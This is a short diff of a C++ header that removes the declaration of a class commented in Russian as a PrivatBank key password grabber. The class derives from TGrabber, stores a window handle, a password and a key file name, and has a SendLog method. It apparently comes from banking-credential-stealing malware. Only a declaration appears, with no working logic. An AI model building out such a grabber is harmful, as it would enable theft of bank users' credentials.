@@ -59,28 +59,5 @@ public:
 
 
 
-
-//*****************************************************
-//  Грабер пароля ключа приватбанка
-//*****************************************************
-class TPrivatBankKeyPassword : public TGrabber
-{
-private:
-	HWND   FWnd;
-	string FPassword;
-	string FKeyFileName;
-
-
-public:
-	TPrivatBankKeyPassword(HWND aWnd, const string& WndText);
-	~TPrivatBankKeyPassword();
-
-	bool SendLog();
-
-	HWND inline Wnd() { return FWnd; }
-};
-
-
-
 //---------------------------------------------------------------------------
 #endif
